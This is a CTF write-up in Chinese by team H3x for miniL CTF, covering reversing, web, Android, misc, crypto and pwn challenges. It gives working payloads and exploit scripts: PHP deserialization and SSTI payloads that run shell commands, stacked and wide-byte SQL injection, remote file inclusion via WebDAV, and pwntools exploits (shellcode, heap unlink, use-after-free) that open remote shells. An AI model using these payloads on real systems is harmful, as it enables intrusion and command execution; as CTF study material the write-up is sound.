# minil ctf wp

## TEAM INFO

### Team

We are **H3x** !

### teammates

cor1e

eqqie 

blackwatch

## REVERSE

### easyre | Author: eqqie

题目很简单，不用理会前面混淆的部分，patch掉for循环里面的if，然后下断，直接看内存就会有flag一个一个字母蹦出来。

### EPL-Fish | Author: eqqie

这是个逆向+MISC，因为初中经常玩易语言，所以对这个易语言出的题比较敏感于是拿了一血。

题目是个模拟QQ的登陆界面（搞得挺像的），但是无论输入什么都提示一样的错误，应该是写死的。这种题动态调试很麻烦...但是调试了一下还是有收获，看到一个类似邮箱和密码的东西，是个163邮箱。于是我马上想到了初中玩过的一种上古盗号方法，就是把输入框的内容作为邮件发送给盗号者。

于是抓包，马上就抓到了邮箱的账号和密钥，去163登录了一下发现登不上，推测这可能不是邮箱密码，而是安全码，可以用于telnet登录smtp和pop发送接收邮件。于是telnet登上去试试果真可以发邮件，然后pop登陆上去，可以看到所有写题的人输入的内容（没注意看有没有人 真的输了账号密码）。

邮件列表中有一个很大的邮件，把内容（base64编码过的）copy下来，有两部分，正文提示附件中有一个文件可以帮助解题。于是python decode拿到附件，是题目源码。

最后的最后找了一大圈....flag居然在源码的注释里面。

## WEB

### P| Author: blackwatch

发现将cookie两部处理后传入file，将cookie里的gitbase64decode一下

`O:5:"gitee":1:{s:4:"file";s:9:"index.php";}`

改成`O:5:"gitee":1:{s:4:"file";s:11:"classes.php";}`

最后的__wakeup魔术方法可以用php反序列化的CVE-2016-7124绕过。看github，是要传参cmd执行，但是过滤了一大堆东西，发现preg_match里唯独保留了P，此题题目也是P，想到看过的一篇文章，利用执行上传的临时文件tmp/phpXXXXXX，原文地址https://www.anquanke.com/post/id/201136

exp:

```python
import requests
import base64

url =''
git = 'O:6:"github":3:{s:4:"file";s:9:"index.php";s:3:"cmd";s:26:"?><?=`. /??p/p?p??????`;?>";}'#反引号不输出，用<?=代替<?php echo输出
git = base64.b64encode(git.encode()).decode()
cookies = {'git': git}
files = {'file': '#!/bin/sh\ncat /* | grep minil'}
a = requests.post(url, files=files, cookies=cookies)
print(a.text)
```





### id_wife| Author: blackwatch

参照强网杯 随便注，堆叠注入和concat绕过。

观察1'报错

`w1nd');`绕过

`w1nd');show tables;`

```
array(1) { [0]=> string(13) "1145141919810" }
array(1) { [0]=> string(4) "user" }
```

`w1nd');set @sql = CONCAT('se','lect * from 1145141919810;');prepare stmt from @sql;execute stmt;#`

strstr区分大小写绕过

`w1nd');Set @sql = CONCAT('se','lect * from 1145141919810;');Prepare stmt from @sql;EXECUTE stmt;#`





### are you reclu3e?| Author: blackwatch

 扫出来了 .index.php.swp .login.php.swp

vim -r 还原

```php
login.php
<?php
    include "connection.php";
    mysqli_query($conn, "SET CHARACTER SET 'gbk'");

    $username=addslashes($_POST['username']);
    $password=addslashes($_POST['password']);
    $msg='';
    if(empty($username)){
        $msg='please post your username';
    }
    else{
        $sql="select * from users where username='$username'";
        $result=mysqli_query($conn,$sql);
        if($result){
            $row=mysqli_fetch_array($result,MYSQLI_ASSOC);
        }
        if(empty($row)){
            $msg='you are not reclu3e';
        }
        else{
            if($row['password']!==$password){
                $msg='I know you are reclu3e but you need post the right password';
            }
            else{
                session_start();
                $_SESSION['uid'] = $username;
                echo '<script>alert("Yes! you are reclu3e")</script>';
            }
        }
    }
    if(!empty($msg)){
        echo "<script>alert('$msg')</script>";
    }
    $conn->close();
    echo "<script type='text/javascript'>";  
    echo "window.location.href='index.php'";  
    echo "</script>";  
```

```php
index.php
<?php
    include "flag.php";//$flag="minilctf{****}";
    session_start();
    if (empty($_SESSION['uid'])) {
        include "loginForm.html";
    }
    else{
        echo '<h1>Hello, reclu3e!</h1>';
        $p=unserialize(isset($_GET["p"])?$_GET["p"]:"");
    }
?>
<?php
class person{
    public $name='';
    public $age=0;
    public $weight=0;
    public $height=0;
    private $serialize='';
    public function __wakeup(){
        if(is_numeric($this->serialize)){
            $this->serialize++;
        }
    }
    public function __destruct(){
        @eval('$s="'.$this->serialize.'";');
    }
}
```

login逻辑是判断输入的密码和取出的usr对应的密码比较，插表，GBK+addslashes 宽字节注入

`username=reclu3e%df%27%20union%20select%201,2%23&password=2`

php反序列化漏洞，private变量名前后要用%00

`@eval('$s="'.$this->serialize.'";');`用";闭合前后

```
/index.php?p= O:6:"person":5:{s:4:"name";s:0:"";s:3:"age";i:0;s:6:"weight";i:0;s:6:"height";i:0;s:17:"%00person%00serialize";s:30:"";highlight_file("flag.php");"";}
```





### Let's_Play_Dolls| Author: blackwatch

看到foo1 foo2 foo3，想起来前段时间遇到的一个题，php反序列化中的POP链构造，现学了一会。

foo3->foo2->foo1，foo1里还需要绕过一次wakeup。

等下foo1里这是啥？

`preg_replace('/[^\W]+\((?R)?\)/', '', $this->var)`

查了一下`?R`，PHP manual中这样说：

**”首先，它匹配一个左括号。 然后它匹配任意数量的非括号字符序列或一个模式自身的递归匹配(比如， 一个正确的括号子串)，最终，匹配一个右括号。“**

大概是这个样子`XXXX(XXXX(XXXX()))`

```
\W等价于[^A-Za-z0-9_]
+括号匹配\( ...... \)
+括号中间是XXXX(XXXX(XXXX()))
```

查到一个payload   `readfile(end(scandir(getcwd())))`

```
O:4:"foo3":1:{s:3:"var";O:4:"foo2":2:{s:3:"var";s:2:"hi";s:3:"obj";O:4:"foo1":2:{s:3:"var";"readfile(end(scandir(getcwd())));;}}}
```

（这里有个小坑，file_exists()直接将输入当成字符串对待，就直接执行了foo2里的__toString()，（我一开始以为要用echo，卡了半天）不知道是出题人有意为之还是怎么样。

 

### Personal_IP_Query| Author: blackwatch

burp加XFF头发现注入点，观察http response 发现用了 gunicorn，应该是python flask的模板注入

尝试 {{1+1}}确认是SSTI，总的来说就是各种继承直到os.popen

有过滤，一点点尝试发现是过滤了_下划线，查了一下可以用request.args获取get参数绕过

```
http://e0579dc296f4fa31220536d95e3b68b5.challenge.mini.lctf.online:1080/?class=__class__&mro=__mro__&subclasses=__subclasses__&init=__init__&globals=__globals__&popen=popen&cmd=cat /flag

X-Forwarded-For: {{ ()[request.args.class][request.args.mro][-1][request.args.subclasses]()[127][request.args.init][request.args.globals][request.args.popen](request.args.cmd).read() }}
```



### include| Author: blackwatch

#由于拿了签到题的一血触发**人类漏洞**（果然人才是最大的漏洞，详情咨询frk），拿到了两个hint **webdav**和#**smb**        参考链接https://www.anquanke.com/post/id/201060

一开始就掉坑里去了，被两处`<?php ?>`包含起来的代码不能互相调用，于是admin就是空值，空值的反序列化是什么呢，自己写了个php试了下：

```
s:0:"";
```

构造好之后返回了`TE9PS0hFUkU=.html`，直接访问会重定向到百度，burp repeater访问得到一串base64

解码之后提示访问f1na1.php，有个seehint点进去url是/f1na1.php?file=hint.php

估计是文件包含，刚才的http response里看到了IIS，就想起了了win下区分大小写，用hint.PHP试了下，成功了，这地方估计过滤了很多协议，此时就用到了webdav，百度了一个利用方法https://paper.seebug.org/1148/，一打就出来了

```
f1na1.php?file=//xxx.xxx.xxx.xxx//webdav/a.txt
```

```
a.txt
<?php system('dir');?>
```

回显里有一个ZmxhZ2ZsQGcxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjMxMjM.txt，直接访问得到flag





### 签 到 题| Author: blackwatch

ls /看到了flag 和readflag，然后看了可用的bash，有sh和ash，不知道ash有什么用，

/readflag返回`do you want the flag?` ，后来🐧说frk喜欢考察linux，或许是交互回复一个yes?找了一下可以交互的函数，找到了**proc_open**，查了下函数的用法，一开始用Yes没用，试了下y有回显，到最后出来一个式子，不知道可不可以用正则，刷新了一下发现有重复的算式，就跑个循环吧，构造如下exp，核心是`y\ny\n120\n`

```python
import requests
import time
url = ''
url += '?a=php%20-r%20%27$descriptors%20=%20array(0%20=%3E%20array(%22pipe%22,%20%22r%22),1%20=%3E%20array(%22pipe%22,%20%22w%22));$process%20=%20proc_open(%22/readflag%22,%20$descriptors,%20$pipes);echo%20fgets($pipes[1]);fwrite($pipes[0],%22y\ny\n120\n%22);fclose($pipes[0]);echo%20fgets($pipes[1]);echo%20fgets($pipes[1]);echo%20fgets($pipes[1]);echo%20fgets($pipes[1]);%27'

while 1:
    r = requests.get(url)
    print(r.text)
    if 'minil' in r.text:
        break
    time.sleep(1)#不用延时的话一直都是docker准备状态 ):
```



## ANDROID

安卓题要是纯考逆向还行，要是考到各种底层原理我就蒙蔽了...毕竟协会里面android逆向方面都是用爱发电，得靠自己钻研。

### TestOnly | Author: eqqie

#### 分析

是个java逆向，逻辑也很很简单，就是两个函数做了些异或之类的加密，把逻辑逆过来写脚本就行了，这里只有个写的很仓促的脚本

#### exp

```python
import hashlib

en_flag = b"U_\005SK`^\x00\021=fWP{\004iUSem7U\0270j\001(\007a\037"
table = b"B08020D0FACFDAF81DB46890E4040EDBB8613DA5ABF038F8B86BD44525D2E27B26E22ACD06388112D8467FD688C79CC7EA83F27440577350E8168C2560368616"
result = ""

hash_table = hashlib.sha1(table).digest()
print(hash_table)
de_table = b""

for i in range(len(hash_table)):
    bi = hash_table[i] & 0xFF
    if(bi<16):
        de_table += b"00"
    else:
        de_table += hex(bi).replace("0x","").ljust(2,"0").encode()
        print(hex(bi).replace("0x","").ljust(2,"0"),end="|")

print(de_table)

for i in range(30):
    bi = chr(en_flag[i] ^ (de_table[i] & 0XFF))
    print(bi,end=".")
    result += bi

print(result.replace("flag","minil"))
```



### Khronos | Author: eqqie

#### 分析

这题挺有意思，逆向之后发现逻辑在C写的lib里面，又变成了C逆向。

IDA里面打开lib找到关键函数，结果发现对flag的中间进行了一大串乱七八糟的加密，加密函数是两个两个字符分组进行处理，处理完后返回结果的最低位字节。对输入内容进行加密后与几个常数作比较，然后估计是存在很多相同解，于是又进行了一次哈希来验证是否为真的flag。

这样的题只能重建加密逻辑，然后26*26个字母组合去遍历加密，然后和常数做对比，最后筛选出了这么一些组合：

```python
['FJ', 'Kh', 'L5', 'TU', 'Wu', 'Z6', 'aK', 'eS', 'pp', '76', '03'] 11
['J!', 'R0', 'aA', 'gp', 'id', 'pA', 'wk', 'xY', 'xp', 'yF', 'yT', 'ym'] 12
['C5', 'D0', 'P7', 'R3', 'fx', 'iu', 'kX', 'mB', 'mk', 'nO', 'oT', 'pP', 'wG', 'yA', 'zN'] 15
['A3', 'K9', 'O7', 'Y0', 'dE', 'jn', 'lb', 'sr', 's_', 'tg', 'wW', '59'] 12
['EO', 'JT', 'La', 'MC', 'OS', 'Oz', 'Sq', 'Tr', 'ZM', 'a4', 'p2', '1S', '2Z', '3C', '4V', '6F', '6V', '7d', '0L', 
'!Z', '_u'] 21
['FZ', 'IS', 'Jc', 'Qk', 'Zn', 'mf', 't0', 'z6', '4c', '94', '!T', '#3', '_m'] 13
['JU', 'Lf', 'Sv', 'S_', 'Tc', 'Ux', 'Ze', 'a5', 'a7', 'p3', 'r#', 'w4', '1R', '4S', '6G', '0O', '!O', '!f', '!r'] 
19
['H2', 'cV', 'ew', 'fC', 'lv', 'rm', 'sp', 'te', 'uA', 'uG', 'vg', 'wU', 'wh', 'zw', '#8'] 15
['BB', 'BF', 'DX', 'RO', 'Rb', 'R_', 'UJ', 'da', 'en', 'fJ', 'gU', 'iC', 'qk', 'sD', 'tx', 'vC', 'vG', 'vW', 'vz', 
'xA', 'xU', '6u', '69', '7S', '9U', '@y'] 26
['CR', 'HC', 'Kc', 'MT', 'M@', 'M}', 'Rm', 'XL', 'ZL', 'Zc', 'c#', '1y', '3o', '0M', '0f', '0v', '!p', '_Y'] 18
    
['C@', 'Dj', 'Fh', 'Gq', 'Gu', 'Hn', 'Po', 'Q_', 'Ri', 'Sr', 'VJ', 'c3', 'd2', 'm5', 'y4', '8E', '_t'] 17
['Co', 'Is', 'KZ', 'Ka', 'Lt', 'MB', 'MR', 'Nf', 'TJ', 'UE', 'YU', 'e9', 'f6', 'h$', '1D', '1k', '1m', '3F', '6n', 
'7X', '0d', '!I'] 22
['AX', 'Aq', 'Cs', 'ED', 'E}', 'Fd', 'M9', 'PZ', 'TV', 'To', 'Ut', 'X7', 'Zm', 'aX', 'n$', 'pN', 'ps', 'rq', 'wf', 
'wv', '1g', '1s', '7@', '8t', '9o'] 25
```

题目中间给了个hint，说flag是有语义的，结合题目出现过的内容，从备选的组合中拼出了个头和尾部（简直考验眼力），然后剩下四位变量用python跑一跑就出来了。

#### exp

```python
import os, sys
flag_len = 32

table = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890@$_}"

flag_en = b"\xf1\x00\x00\x00\xb7"
flag_en += b"\x01\x00\x00\x20\x05"
flag_en += b""


def encode(num: int):
    v1 = 0
    v3 = 0
    v4 = 0
    v5 = 0
    v6 = 0
    v7 = 0
    v8 = 0
    v9 = 0
    v10 = 0
    v11 = 0
    v12 = 0
    v13 = 0
    v14 = 0
    v15 = 0
    v16 = 0
    v17 = 0
    v18 = 0
    v19 = 0
    v20 = 0
    v21 = 0
    v22 = 0
    v23 = 0
    v24 = 0
    v25 = 0
    v26 = 0
    v27 = 0
    v28 = 0
    v29 = 0
    v30 = 0
    v31 = 0
    v32 = 0
    v33 = 0
    v34 = 0
    v35 = 0
    v36 = 0
    v37 = 0
    v38 = 0
    v39 = 0
    v41 = 0
    v42 = 0
    input_1 = num

    while True:
        v41 = v3
        v42 = v1
        v5 = (input_1 & 0x88880C92)
        v6 = 0
        if input_1 & 0x88880C92:
            v6 = 0
            while True:
                v6 ^= v5 & 1
                v5 >>= 1
                if not v5:
                    break
        v7 = v6 ^ 2*input_1
        v8 = 0
        v10 = (v7 & 0x88880C92)
        v9 = 1 if ((v7 & 0x88880C92) == 0) else 0
        v11 = 2*v7
        v12 = 0
        if not v9:
            v12 = 0
            while True:
                v12 ^= v10 & 1
                v10 >>= 1
                if not v10:
                    break
        v13 = v12 ^ v11
        v14 = v12 ^ 2 * v6
        v15 = (v13 & 0x88880C92)
        if v13 & 0x88880C92:
            v8 = 0
            while True:
                v8 ^= v15 & 1
                v15 >>= 1
                if not v15:
                    break
        v16 = v8 ^ 2*v13
        v17 = v8 ^ 2*v14
        v18 = 0
        v19 = (v16 & 0x88880C92)
        v9 = 1 if ((v16 & 0x88880C92) == 0) else 0
        v20 = 2*v16
        v21 = 0
        if not v9:
            v21 = 0
            while True:
                v21 ^= v19 & 1
                v19 >>= 1
                if not v19:
                    break
        v22 = v21 ^ v20
        v23 = v21 ^ 2*v17
        v24 = (v22 & 0x88880C92)
        v9 = 1 if (v22 & 0x88880C92) == 0 else 0
        v25 = 2*v22
        if not v9:
            v18 = 0
            while True:
                v18 ^= v24 & 1
                v24 >>= 1
                if not v24:
                    break
        v26 = v18 ^ v25
        v27 = v18 ^ 2*v23
        v28 = 0
        v29 = (v26 & 0x88880C92)
        v9 = 1 if ((v26 & 0x88880C92) == 0) else 0
        v30 = 2*v26
        v31 = 0
        if not v9:
            v31 = 0
            while True:
                v31 ^= v29 & 1
                v29 >>= 1
                if not v29:
                    break
        v32 = v31 ^ v30
        v33 = v31 ^ 2 * v27
        v34 = (v32 & 0x88880C92)
        v9 = 1 if ((v32 & 0x88880C92) == 0) else 0
        v35 = 2 * v32
        if not v9:
            v28 = 0
            while True:
                v28 ^= v34 & 1
                v34 >>= 1
                if not v34:
                    break
        v36 = v28 ^ v35
        v37 = v28 ^ 2 * v33
        v38 = (v36 & 0x88880C92)
        v39 = 2 * v36
        if v36 & 0x88880C92:
            v4 = 0
            while True:
                v4 ^= v38 & 1
                v38 >>= 1
                if not v38:
                    break
        else:
            v4 = 0
        input_1 = v4 ^ v39
        v3 = ((v4 ^ 2*v37)+2*(v41))
        v1 = v42 + 1
        if not (v42 != 31):
            break
    return ((v4 ^ 2*v37)+2*(v41))&0xFF

total = []
def test(b:int):
    global total
    f = open("khronos","a+")
    result_array = []
    for i in table:
        for j in table:
            result = encode(((i << 8)+j)&0xFFFFFFFF)
            if result == b:
                result_array.append(chr(i)+chr(j))
                f.write(chr(i)+chr(j)+"\n")
                print(chr(i), chr(j))
                f.write("input:"+str((i << 8)+j)+"\n")
                print("input:", (i << 8)+j)
                f.write(hex(result)+"\n")
                print(hex(result))
    f.write("--------------------------------\n")
    f.close()
    total.append(result_array)               

test(0xF1)
test(0xB7)
test(0x1A)
test(0x52)
test(0x6B)
test(0x49)
test(0x76)
test(0x02)
test(0xC1)
test(0xD6)
test(0x4E)
test(0xB6)
test(0xE0)


c = ['JU', 'Lf', 'Sv', 'S_', 'Tc', 'Ux', 'Ze', 'a5', 'a7', 'p3', 'w4', '1R', '4S', '6G', '0O'] 
d = ['H2', 'cV', 'ew', 'fC', 'lv', 'rm', 'sp', 'te', 'uA', 'uG', 'vg', 'wU', 'wh', 'zw'] 
e = ['BB', 'BF', 'DX', 'RO', 'Rb', 'R_', 'UJ', 'da', 'en', 'fJ', 'gU', 'iC', 'qk', 'sD', 'tx', 'vC', 'vG', 'vW', 'vz', 'xA', 'xU', '6u', '69', '7S', '9U', '@y'] 
f = ['CR', 'HC', 'Kc', 'MT', 'M@', 'M}', 'Rm', 'XL', 'ZL', 'Zc', '1y', '3o', '0M', '0f', '0v', '_Y'] 


front = "minil{KhR0nOs_1S_m"  
end = "_t1mE}"
#minil{KhR0nOs_1S_m4SteR_0f_t1mE}
def check(flag):
    v8 = 0
    for ch in flag:
        v8 = 1331*v8 + ord(ch)
    if (((v8 & 0x7FFFFFFF)==0x7304BF7A) | 2) == 3:
        print("getflag:",flag)
        sys.exit(0)


for c1 in c:
    for d1 in d:
        for e1 in e:
            for f1 in f:
                flag_tmp = front+c1+d1+e1+f1+end
                print(flag_tmp)
                check(flag_tmp)
```



## MISC

### MiniGameHacking | Author: eqqie

送分misc，u3d写的游戏，删掉目录下那个疑似保护程序的东西，用CE来改敌人生命值为0并锁定，一直放招就过关了。

### EasyVmem | Author: eqqie

啊这题老早就做到最后一步了，但是去抽时间写了pwn，丢掉了一血。

#### 分析

volatility分析内存镜像，先查看剪切板，有个不完整的base64，解吗之后是说要string查一个字符串，结果查了之后只是提示游戏开始，没啥卵用....

查看进程，马上看到一个伪造的explorer，导出来逆向，输入密码得到一个hint，说记事本有一个secret...

但是win7镜像不能直接查看记事本，于是直接导出记事本的进程内存，string过滤，得到一堆看似坐标的东西，盲猜可以构造成图像，于是全导出来写脚本解密

#### exp

```python
#!/usr/bin/python

import turtle

turtle.screensize(300, 300)

f = open("s3cR3t.txt","r")

while 1:
    i = f.readline()[7:].split(" ")
    x = int(i[0])
    y = int(i[1])
    print "position:",x,y
    turtle.goto(x,y)
    turtle.down()
    turtle.goto(x,y)
    turtle.up()
```

### MITM_0 & MITM_1 & MITM_2 | Author: eqqie

唉....这是最可惜的一个系列，强王给了挺多提示，但是计网基础太差终归没做出第三题，深感计算机方面基础知识掌握太少了。

#### 分析

第一题：查看arp包就可以很明显看到是哪个IP在捣乱

第二题：过滤出TLS握手包，看看就可以看到一个很明显的自签证书

## CRYPTO

### ill & f**k&base | Author: eqqie

这两题本质是一样的，只不过第二题套了个brainfuck...

ill算法是解题的重要思路，奈何看不懂，但是一番搜寻找到了个exp，稍微改动了一下就可以拿来解题了

该exp需要使用mega运行，为此下了好久的环境...

#### exp

```python
#sage
from Crypto.Util.number import *
'''
'''
def GaussLatticeReduction(v1, v2):
    while True:
        if v2.norm() < v1.norm():
            v1, v2 = v2, v1
        m = round( v1*v2 / v1.norm()^2 )
        if m == 0:
            return (v1, v2)
        v2 = v2 - m*v1

'''
p=126982824744410328945797087760338772632266265605499464155168564006938381164343998332297867219509875837758518332737386292044402913405044815273140449332476472286262639891581209911570020757347401235079120185293696746139599783586620242086604902725583996821566303642800016358224555557587702599076109172899781757727
h=31497596336552470100084187834926304075869321337353584228754801815485197854209104578876574798202880445492465226847681886628987815101276129299179423009194336979092146458547058477361338454307308727787100367492619524471399054846173175096003547542362283035506046981301967777510149938655352986115892410982908002343
c=81425203325802096867547935279460713507554656326547202848965764201702208123530941439525435560101593619326780304160780819803407105746324025686271927329740552019112604285594877520543558401049557343346169993751022158349472011774064975266164948244263318723437203684336095564838792724505516573209588002889586264735
'''
'''
p=126144797452451999040656533353055522552247032483156927400829942850702503126085818799569364702233909641153270641606798547585245441691857490112991018462139784784032662291892431323682372275742064291388211916537864638144094958082303092663218585684797511816512788271536983127128482574982989855009566969252169463603
h=79073681723749844402174038746809050940767578658525858667863461520703208046517498606496755539541914689175559903369163080019747983616370381881888360250681876866576533136375365102662524613399548461942445436867220596683960606927977995785649390078898135965832217288160899978651224469973212060593835971793504106122
c=100937236170096412915841578000289968864609398878837243831166757732427810900758445108255232568792658193721448217467561463953338194033036389686696408265280746898160323186485945688275219467531750179548907072330780323097218285221388771614111285017807833235483447429699036096943350951268511484336458045609255443500
'''
f=4685394431238242086047454699939574117865082734421802876855769683954689809016908045500281898911462887906190042764753834184270447603004244910544167081517863
g=5326402554595682620065287001809742915798424911036766723537742672943459577709829465021452623299712724999868094408519004699993233519540500859134358256211397
p=172620634756442326936446284386446310176482010539257694929884002472846127607264743380697653537447369089693337723649017402105400257863085638725058903969478143249108126132543502414741890867122949021941524916405444824353100158506448429871964258931750339247018885114052623963451658829116065142400435131369957050799
c=130055004464808383851466991915980644718382040848563991873041960765504627910537316320531719771695727709826775790697704799143461018934672453482988811575574961674813001940313918329737944758875566038617074550624823884742484696611063406222986507537981571075140436761436815079809518206635499600341038593553079293254
f_inv_p=inverse(f,p)
h=f_inv_p*g%p

# Construct lattice.
v1 = vector(ZZ, [1, h])
v2 = vector(ZZ, [0, p])
m = matrix([v1,v2]);

# Solve SVP.
v1 = vector(ZZ, [1, h])
v2 = vector(ZZ, [0, p])
m = matrix([v1,v2]);
shortest_vector = m.LLL()[0]
#shortest_vector = GaussLatticeReduction(v1, v2)[0]
f, g = shortest_vector
f = -f
g = -g
print(f, g)

# Decrypt.
a = f*c % p % g
m = a * inverse_mod(f, g) % g
print(m)
print(long_to_bytes(m))
print(hex(m))
print(len(hex(m)))
```



## PWN

### hello | Author: cor1e

又有堆栈可执行，又有输入长度限制不够普通rop链长度，典型题，一句payload就行。

（1.输入位置是在ebp-48处，所以填充56位到返回地址处。2.执行完jmp rsp后栈顶距离shellcode储存处为64字节，故sub rsp,64。3.asm汇编时要先注明64位还是32位（即context.arch=''））

exp:

```python
#!usr/bin/python3

from pwn import*

p=remote('pwn.challenge.mini.lctf.online',10050)

context.log_level='debug'
context.arch='amd64'

p.recvuntil('?')
jmp_rsp=0x4006ca #gadget


payload1=asm(shellcraft.sh())+b'A'*(56-len(asm(shellcraft.sh())))+p64(jmp_rsp)+asm('sub rsp,64;jmp rsp')
p.sendline(payload1)

p.interactive()

```



### ezsc | Author: eqqie

题面很简单，输入纯字母数字的shellcode就能getshell，github上已经有造好的轮子，搜索alpha-shellcode就可以查到很多。这些脚本可以把pwntools生成的shellcode转换为alpha-shellcode。

下面是比赛时我用的:

```
Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t
```



### noleak | Author: eqqie

是一道堆题，我就知道师傅们说只出栈相关的题目是骗人的...

检查二进制文件发现可以改写got表，在IDA中逆向发现在0x400C9F有一个白给的后门函数，于是猜测可能是修改got表调用该后门函数。

程序本身有**分配**、**编辑**和**释放**堆块的功能，堆块的指针存放在bss段，并且不存在悬挂指针。那就只能想办法堆溢出构造unlink，控制bss区，间接控制堆块指针，从而达到任意写来修改got表。

溢出点在用作输入的函数，为了末尾置\0，输入时会做 **len-1** 运算，如果len为0就会发生无符号整数溢出，导致创建堆块时可以输入任意长度字节。

于是大致的堆块分布就有了：

```
------------------------ 0x40
用于构造fakechunk
------------------------ 0x20 “malloc(0)”
用于溢出修改下一个堆块
------------------------ 0x100
修改本堆块的prev_size和size并
释放，造成unlink
------------------------ 0x20
用来分隔，防止合并时触发堆块回收
而报错
------------------------ top chunk
....
```

接下来构造exp：

```python
from pwn import *

#p = process("./time")
p = remote("pwn.challenge.mini.lctf.online",10065)
elf = ELF("./time")
libc = ELF("libc.so.6")

atoi_got = elf.got[b"atoi"]
back_door = 0x400C9F

context.log_level = "debug"

def setplan(size:int,content):
    p.recvuntil(b"Your choice : ")
    p.sendline(b"1")
    p.recvuntil(b"How many minutes will it take you to finish?\n")
    p.sendline(str(size).encode())
    p.recvuntil(b"Content of the plan: ")
    p.sendline(content)
    
def edit(idx:int,size:int,content):
    p.recvuntil(b"Your choice : ")
    p.sendline(b"2")  
    p.recvuntil(b"Index : ")
    p.sendline(str(idx).encode())
    p.recvuntil(b"How many minutes will it take you to finish?\n")
    p.sendline(str(size).encode())
    p.recvuntil(b"Content of the plan: ")
    p.sendline(content)    
    
def end(idx:int):
    p.recvuntil(b"Your choice : ")
    p.sendline(b"3")  
    p.recvuntil(b"Index : ")
    p.sendline(str(idx).encode())
    
    
def exp():
    setplan(0x30,b"aaaa") #idx0
    setplan(0,b"a"*0x18) #idx1
    setplan(0xf0,b"aaaa") #idx2
    setplan(0x10,b"aaaa") #idx3
    #gdb.attach(p)
    ptr = 0x6020C0
    fd = ptr - 0x18
    bk = ptr - 0x10
    payload1 = p64(0) + p64(0x21) + p64(fd) + p64(bk) + p64(0x20) + p64(0) #fake chunk
    edit(0,0,payload1)
    payload2 = b"a"*0x10 + p64(0x50) + b"\x00"
    edit(1,0,payload2)
    end(2)
    payload3 = p64(0)*3 + p64(atoi_got)
    edit(0,0,payload3)
    #gdb.attach(p)
    edit(0,0,p64(back_door))
    
    p.sendline(b"/bin/sh")
    p.interactive()
    
if __name__ == "__main__":
    exp()
```



### easycpp | Author: eqqie

#### 分析

这是一道c++的pwn，IDA直接F5逆向出来看得不是很清楚，建议直接看汇编比较明了。

下面是main函数：

```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  B *ptr; // eax
  B *B1; // ebx

  setvbuf(stdout, 0, 2, 0);                     // 无缓冲
  ptr = (B *)operator new(4u);                  // 实例化一个B对象
  B1 = ptr;
  ptr->_vptr_A = 0;
  B::B(ptr);
  operator delete(B1);
  fgets(buf, 1024, stdin);
  strdup(buf);                                  // 用buf所在的字符串大小来开辟空间
  ((void (__cdecl *)(B *))*B1->_vptr_A)(B1);
  return 0;
}
```

可以看到最后把某个地址变成了函数指针然后调用

B::B(void)里面长这样：

```c++
void __cdecl B::B(B *const this)
{
  A::A(&this->0);
  this->_vptr_A = (int (**)(...))&off_80489E4;  // 动态加载一个地址
}
```



strdup会调用malloc为buf分配内存，而之前实例化对象时也会在堆上分配内存，并且在输入前就被销毁了。推测是UAF导致了我们能够控制最后的那个地址。

试着动态调试：

输入"aaaa\n"，strdup之后打断点看堆之后发现果然有我们的输入在堆上：

```shell
Chunk(addr=0x804fe18, size=0x10, flags=PREV_INUSE)
    [0x0804fe18     61 61 61 61 0a 00 00 00 00 00 00 00 e1 01 02 00    aaaa............]
```

于是我们可以看看这地方在没输入之前是什么，在B1对象被销毁前下断点：

```shell
Chunk(addr=0x804fa10, size=0x10, flags=PREV_INUSE)
    [0x0804fa10     e4 89 04 08 00 00 00 00 00 00 00 00 e9 05 02 00    ................]
```

看到一个地址：**0x080489e4**

是个在.rodata段的地址，IDA中看下：

```shell
rodata:080489E4 off_80489E4     dd offset _ZN1B5printEv ; DATA XREF: B::B(void)+15↑o
```

又是一个偏移，再跟过去：

```shell
.text:080488F2 ; __unwind {
.text:080488F2                 push    ebp
.text:080488F3                 mov     ebp, esp
.text:080488F5                 sub     esp, 8
.text:080488F8                 sub     esp, 0Ch
.text:080488FB                 push    offset aClassB11 ; "class B11"
.text:08048900                 call    _puts
.text:08048905                 add     esp, 10h
.text:08048908                 nop
.text:08048909                 leave
.text:0804890A                 retn
.text:0804890A ; } // starts at 80488F2
```

原来如此，堆上存放的地址是一个二级指针，我们只需要在UAF的时候构造一个二级指针即可。况且输入同时存在于bss和堆上，这就更方便了：

#### exp：

```python
from pwn import *

p = remote("pwn.challenge.mini.lctf.online",10091)
elf = ELF("easycpp")
libc = ELF("libc.so.6")

context.log_level = "debug"
context.arch = "i386"

payload1 = asm(shellcraft.sh())
p.sendline(p32(0x804A0C0+4)+p32(0x80487bb))

p.interactive()
```



### heap_master | Author: eqqie

果然sad都有困难的题对我来说更难了，于是一顿疯狂gooooooogle，查到了一些类似的题，找到了点思路，然后一顿爆炸调试才解决。有点可惜一血被外校拿了...

#### **逆向分析**

开局暴击，由于使用了沙箱机制，execve的syscall被禁用了，可以查看init函数：

```c
  v31 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);                          // 无缓冲
  prctl(38, 1LL, 0LL, 0LL, 0LL);
  v3 = 32;
  v4 = 0;
  v5 = 0;
  v6 = 4;
  v7 = 21;
  v8 = 0;
  v9 = 4;
  v10 = -1073741762;
  v11 = 32;
  v12 = 0;
  v13 = 0;
  v14 = 0;
  v15 = 53;
  v16 = 2;
  v17 = 0;
  v18 = 0x40000000;
  v19 = '\x15';
  v20 = 1;
  v21 = 0;
  v22 = 59;
  v23 = 6;
  v24 = 0;
  v25 = 0;
  v26 = '\xFF\0\0';
  v27 = 6;
  v28 = 0;
  v29 = 0;
  v30 = 0;
  v1 = 7;
  v2 = &v3;
  prctl(22, 2LL, &v1);
  return __readfsqword(0x28u) ^ v31;
```



程序开始让输入了一长串内容到栈上，并且没有溢出，于是想到可能是要在栈上构造rop。

除去这些程序的功能就是普通堆题的功能。出题人提示这题的环境搭建在libc2.23或libc2.27，需要自己发现。

结果测试了一下发现有tcache...是在libc2.27上，但是我电脑里只有ubuntu16，于是花了半天在ubuntu16上折腾。发现实在不行，又花了一天配置ubuntu18的环境，用掉了好多时间。

